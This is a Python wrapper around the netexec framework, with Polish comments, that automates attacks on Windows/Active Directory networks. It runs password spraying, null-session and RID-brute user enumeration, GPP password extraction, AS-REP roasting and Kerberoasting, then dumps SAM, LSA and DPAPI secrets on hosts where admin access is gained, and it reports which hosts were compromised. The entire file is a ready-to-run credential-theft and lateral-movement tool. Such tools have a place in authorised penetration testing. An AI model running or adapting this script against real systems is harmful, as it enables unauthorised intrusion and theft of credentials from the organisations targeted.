#!/usr/bin/env python3
"""nxsweep - wrapper na netexec: initial enum + macierz statusow per host/protokol.

  ./nxsweep.py -t 10.10.10.10 -u jdoe -p 'Passw0rd!' -d corp.local
  ./nxsweep.py -t hosts.txt -u users.txt -p passwords.txt -d corp.local   # spray
  ./nxsweep.py -t dc01.corp.local -u jdoe -H 31d6cfe0... --bh --loot
  ./nxsweep.py -t dc01.corp.local -u jdoe -p 'x' -d corp.local -k
  ./nxsweep.py -t 10.10.10.10 -u jdoe -p 'x' --dry-run
"""
import argparse
import os
import re
import subprocess
import sys
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

# ---------------------------------------------------------------- statusy
DOWN, OPEN, AUTH_FAIL, AUTH_OK, PWNED = "DOWN", "OPEN", "AUTH_FAIL", "AUTH_OK", "PWNED"
RANK = {DOWN: 0, OPEN: 1, AUTH_FAIL: 2, AUTH_OK: 3, PWNED: 4}
OFF, HDR, DIM = "\033[0m", "\033[1;36m", "\033[90m"
GREEN, RED, YELLOW, CYAN = "\033[1;32m", "\033[1;31m", "\033[33m", "\033[36m"
PAINT = {PWNED: RED, AUTH_OK: GREEN, AUTH_FAIL: YELLOW, OPEN: CYAN, DOWN: DIM}
USE_COLOR = True


def c(code, text):
    return f"{code}{text}{OFF}" if USE_COLOR else text


def paint_line(line):
    """[+] podswietlone, Pwn3d! na czerwono, porazki wyszarzone, reszta zwykla."""
    if "Pwn3d!" in line:
        return c(RED, line)
    if "[+]" in line:
        return c(GREEN, line)
    if "[-]" in line:
        return c(DIM, line)
    if "[!]" in line:
        return c(YELLOW, line)
    return line


def paint_report(txt):
    for st in (PWNED, AUTH_OK, AUTH_FAIL, OPEN, DOWN):
        txt = re.sub(rf"\b{st}\b", lambda m, s=st: c(PAINT[s], m.group()), txt)
    return txt

PROTOCOLS = ["smb", "ldap", "mssql", "winrm", "ssh", "rdp"]

ANSI = re.compile(r"\x1b\[[0-9;]*m")
# SMB   10.10.10.5   445   DC01   [+] corp.local\user:pass (Pwn3d!)
LINE = re.compile(
    r"^(?P<proto>[A-Z0-9]+)\s+(?P<host>\S+)\s+(?P<port>\d+)\s+(?P<name>\S+)\s+"
    r"\[(?P<mark>[-+*!])\]\s*(?P<msg>.*)$"
)
# ta sama linia ALE bez markera = wiersz z danymi (userzy, share'y, hashe)
DATA_LINE = re.compile(r"^[A-Z0-9]+\s+\S+\s+\d+\s+\S+\s+(?P<msg>.+)$")


# ---------------------------------------------------------------- checki
@dataclass
class Check:
    id: str
    proto: str
    args: list = field(default_factory=list)
    when: str = "auth"      # always | auth | pwned | opt
    auth: str = "creds"     # creds | null | local
    label: str = ""


CHECKS = [
    # --- faza 1: probe (zawsze, buduje macierz statusow) ---
    *[Check(f"probe-{p}", p, [], when="always", label=f"probe {p.upper()}")
      for p in PROTOCOLS],
    Check("smb-null-users", "smb", ["--users"], when="always", auth="null",
          label="null session: userzy"),
    Check("mssql-local", "mssql", [], when="always", auth="local",
          label="MSSQL local-auth"),

    # --- faza 2: enum (tylko tam gdzie auth przeszedl) ---
    Check("smb-shares",   "smb", ["--shares"],              label="share'y"),
    Check("smb-rid",      "smb", ["--rid-brute", "10000"],  label="RID brute"),
    Check("smb-gpp-pass", "smb", ["-M", "gpp_password"],    label="GPP password"),
    Check("smb-gpp-auto", "smb", ["-M", "gpp_autologin"],   label="GPP autologin"),

    Check("ldap-asrep", "ldap", ["--asreproast", "{out}/asrep.hashes"], label="AS-REP roast"),
    Check("ldap-kerb",  "ldap", ["--kerberoasting", "{out}/kerb.hashes"], label="Kerberoast"),
    Check("ldap-desc",  "ldap", ["-M", "get-desc-users"],   label="opisy userow"),
    Check("ldap-adcs",  "ldap", ["-M", "adcs"],             label="ADCS"),

    # --- faza 3: loot (tylko przy Pwn3d!, flaga --loot) ---
    Check("loot-sam",   "smb", ["--sam"],   when="pwned", label="SAM"),
    Check("loot-lsa",   "smb", ["--lsa"],   when="pwned", label="LSA"),
    Check("loot-dpapi", "smb", ["--dpapi"], when="pwned", label="DPAPI"),

    # --- opcjonalne (wlaczane flaga) ---
    Check("ldap-bloodhound", "ldap",
          ["--bloodhound", "--collection", "All", "--dns-server", "{dc}"],
          when="opt", label="BloodHound"),
    Check("rdp-screenshot", "rdp", ["--screenshot"], when="opt", label="RDP screenshot"),
]

OPTIONAL = {"ldap-bloodhound": "bh", "rdp-screenshot": "screenshot"}

# co wyciagnac do sekcji FINDINGS: check_id -> regex dopasowywany do linii
FINDINGS = {
    "smb-null-users": "DATA",
    "smb-shares":     "DATA",
    "smb-rid":        r"SidTypeUser",
    "smb-gpp-pass":   r"Found credentials|usernames:|passwords:|cpassword",
    "smb-gpp-auto":   r"Found credentials|usernames:|passwords:",
    "ldap-desc":      "DATA",
    "ldap-adcs":      "DATA",
    "loot-sam":       "DATA",
    "loot-lsa":       "DATA",
    "loot-dpapi":     "DATA",
}


# ---------------------------------------------------------------- args
def parse_args():
    p = argparse.ArgumentParser(description="netexec initial enum wrapper")
    p.add_argument("-t", "--target", required=True, help="IP / FQDN / CIDR / plik z hostami")
    p.add_argument("-u", "--user", default="", help="user albo plik z userami")
    p.add_argument("-p", "--password", default="", help="haslo albo plik z haslami")
    p.add_argument("-H", "--hash", default="", help="NT hash albo LM:NT")
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--dc", default="", help="adres DC - checki LDAP leca tylko tu")
    p.add_argument("--dc-ip", default="", help="dns-server dla BloodHound (default: --dc)")
    p.add_argument("-k", "--kerberos", action="store_true", help="auth Kerberos")
    p.add_argument("--kcache", action="store_true", help="uzyj KRB5CCNAME (--use-kcache)")
    p.add_argument("--kdchost", default="", help="FQDN KDC")
    p.add_argument("--local", action="store_true", help="--local-auth dla wszystkiego")
    p.add_argument("-o", "--out", default="")
    p.add_argument("--bh", action="store_true", help="zbierz BloodHound")
    p.add_argument("--screenshot", action="store_true", help="RDP screenshot")
    p.add_argument("--loot", action="store_true", help="SAM/LSA/DPAPI przy Pwn3d!")
    p.add_argument("--skip", default="", help="pomin checki po id, po przecinku")
    p.add_argument("--timeout", type=int, default=300)
    p.add_argument("--nxc", default="nxc")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--dry-run", action="store_true", help="tylko wypisz komendy")
    return p.parse_args()


def is_list(value):
    return bool(value) and Path(value).is_file()


def build_auth(a, mode):
    """Jedno miejsce budujace auth - wszystkie checki z tego korzystaja."""
    if mode == "null":
        return ["-u", "", "-p", ""]

    args = ["-u", a.user]
    args += ["-H", a.hash] if a.hash else ["-p", a.password]
    if a.domain:
        args += ["-d", a.domain]
    if a.kerberos:
        args.append("-k")
    if a.kcache:
        args.append("--use-kcache")
    if a.kdchost:
        args += ["--kdcHost", a.kdchost]
    if a.local or mode == "local":
        args.append("--local-auth")
    # przy listach nxc domyslnie przerywa po pierwszym trafieniu
    if is_list(a.user) or is_list(a.password):
        args.append("--continue-on-success")
    return args


# ---------------------------------------------------------------- runner
def run(a, outdir, chk, results):
    fmt = {"out": str(outdir), "dc": a.dc_ip}
    target = a.dc if (chk.proto == "ldap" and a.dc) else a.target
    cmd = [a.nxc, chk.proto, target] + build_auth(a, chk.auth) + \
          [x.format(**fmt) for x in chk.args]

    if a.dry_run:
        print(" ".join(cmd))
        results[chk.id] = ""
        return ""

    print(f"{HDR}[*] {chk.label or chk.id}{OFF}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=a.timeout)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        out = f"[!] TIMEOUT po {a.timeout}s"
    except FileNotFoundError:
        sys.exit(f"nie znalazlem '{a.nxc}' w PATH")

    out = ANSI.sub("", out)
    if out.strip():
        print("\n".join(paint_line(l) for l in out.rstrip().splitlines()))
    else:
        print(c(DIM, "  (brak odpowiedzi)"))
    (outdir / f"{chk.id}.log").write_text(f"# $ {' '.join(cmd)}\n\n{out}")
    results[chk.id] = out
    return out


# ---------------------------------------------------------------- parsowanie
def parse_lines(text):
    rows = []
    for line in ANSI.sub("", text).splitlines():
        m = LINE.match(line.strip())
        if m:
            rows.append(m.groupdict())
    return rows


def classify(row):
    if row["mark"] == "+":
        return PWNED if "Pwn3d!" in row["msg"] else AUTH_OK
    if row["mark"] == "-":
        return AUTH_FAIL
    return OPEN          # [*] / [!] = port odpowiada, ale bez auth


def update_matrix(matrix, text):
    """matrix[(host, proto)] = najwyzszy zaobserwowany status"""
    for row in parse_lines(text):
        key = (row["host"], row["proto"].lower())
        new = classify(row)
        if RANK[new] > RANK.get(matrix.get(key, DOWN), 0):
            matrix[key] = new


def status_of(matrix, proto):
    best = DOWN
    for (host, pr), st in matrix.items():
        if pr == proto and RANK[st] > RANK[best]:
            best = st
    return best


# ---------------------------------------------------------------- raport
def report(a, outdir, matrix, results):
    out = [f"=== nxsweep {a.target} ({datetime.now():%Y-%m-%d %H:%M}) ===", ""]

    hosts = sorted({h for (h, _) in matrix})
    out.append("--- MACIERZ STATUSOW ---")
    out.append(f"{'HOST':<22}" + "".join(f"{p.upper():<11}" for p in PROTOCOLS))
    for h in hosts:
        out.append(f"{h:<22}" + "".join(
            f"{matrix.get((h, p), DOWN):<11}" for p in PROTOCOLS))
    out += ["",
            "DOWN=brak odpowiedzi  OPEN=port otwarty, auth nieudany/niepodjety",
            "AUTH_FAIL=creds odrzucone  AUTH_OK=logowanie dziala  PWNED=admin",
            ""]

    out.append("--- FINDINGS ---")
    found = False
    for cid, pattern in FINDINGS.items():
        text = results.get(cid, "")
        if not text:
            continue
        if pattern == "DATA":
            hits = [m.group("msg").strip() for l in (x.strip() for x in text.splitlines())
                    if not LINE.match(l) and (m := DATA_LINE.match(l))]
        else:
            hits = [l.strip() for l in text.splitlines() if re.search(pattern, l, re.I)]
        hits = list(dict.fromkeys(hits))
        if hits:
            found = True
            out.append(f"[{cid}]")
            out += [f"  {h}" for h in hits[:40]]
            out.append("")
    if not found:
        out.append("(nic)\n")

    out.append("--- HASHE ---")
    any_hash = False
    for f in ("kerb.hashes", "asrep.hashes"):
        pth = outdir / f
        if pth.exists() and pth.stat().st_size:
            any_hash = True
            out.append(f"  {pth}: {len(pth.read_text().splitlines())} szt.")
    if not any_hash:
        out.append("  (brak)")
    out.append("")

    if any("STATUS_ACCOUNT_LOCKED_OUT" in t for t in results.values()):
        out.append("!!! LOCKOUT WYKRYTY - przerwij spray !!!\n")

    txt = "\n".join(out)
    (outdir / "REPORT.txt").write_text(txt)
    return txt


# ---------------------------------------------------------------- main
def main():
    global USE_COLOR
    a = parse_args()
    USE_COLOR = (not a.no_color and sys.stdout.isatty()
                 and not os.environ.get("NO_COLOR"))
    if not a.dc_ip:
        a.dc_ip = a.dc or a.target
    if a.kcache and not os.environ.get("KRB5CCNAME"):
        print("[!] --kcache a KRB5CCNAME nie ustawione")

    stem = Path(a.target).name.replace("/", "_")
    outdir = Path(a.out or f"nxsweep-{stem}-{datetime.now():%Y%m%d-%H%M%S}")
    outdir.mkdir(parents=True, exist_ok=True)
    skip = {s.strip() for s in a.skip.split(",") if s.strip()}

    results, matrix = {}, {}
    have_creds = bool(a.user)

    print(f"target : {a.target}\nuser   : {a.user or '<brak>'}\n"
          f"auth   : {'hash' if a.hash else 'kerberos' if a.kerberos else 'haslo'}\n"
          f"out    : {outdir}\n")

    # faza 1 - probe
    for chk in [c for c in CHECKS if c.when == "always"]:
        if chk.id in skip or (chk.auth != "null" and not have_creds):
            continue
        update_matrix(matrix, run(a, outdir, chk, results))

    # faza 2 - enum tylko tam gdzie auth dziala
    if have_creds:
        for chk in [c for c in CHECKS if c.when == "auth"]:
            if chk.id in skip:
                continue
            st = status_of(matrix, chk.proto)
            if not a.dry_run and RANK[st] < RANK[AUTH_OK]:
                print(f"{DIM}[-] pomijam {chk.id}: {chk.proto.upper()}={st}{OFF}")
                continue
            update_matrix(matrix, run(a, outdir, chk, results))

    # faza 3 - loot
    if a.loot and (a.dry_run or status_of(matrix, "smb") == PWNED):
        for chk in [c for c in CHECKS if c.when == "pwned"]:
            if chk.id not in skip:
                update_matrix(matrix, run(a, outdir, chk, results))

    # opcjonalne
    for chk in [c for c in CHECKS if c.when == "opt"]:
        if chk.id in skip or not getattr(a, OPTIONAL[chk.id]):
            continue
        update_matrix(matrix, run(a, outdir, chk, results))

    if a.dry_run:
        return
    print("\n" + paint_report(report(a, outdir, matrix, results)))
    print(f"logi -> {outdir}")


if __name__ == "__main__":
    main()
